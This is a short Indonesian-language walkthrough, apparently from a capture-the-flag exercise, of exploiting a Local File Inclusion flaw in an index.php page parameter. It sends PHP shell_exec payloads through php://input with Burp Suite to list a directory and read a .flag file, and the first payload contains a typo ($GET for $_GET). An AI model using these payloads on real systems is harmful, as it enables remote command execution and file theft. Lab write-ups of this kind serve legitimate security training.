- mencari link index.php?page=pesan

https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601

lalu ubah urlnya menjadi => ?page=php://input&cmd=ls
lalu tambahkan body pada burpsuite => <?php echo shell_exec($GET["cmd"]) ;?>
jika sudah maka kita bisa ubah body burpsuitenya menjadi yang kita inginkan seperti
<?php echo shell_exec("ls -al /home/test/") ;?>
<?php echo shell_exec("cat /home/test/.flag") ;?>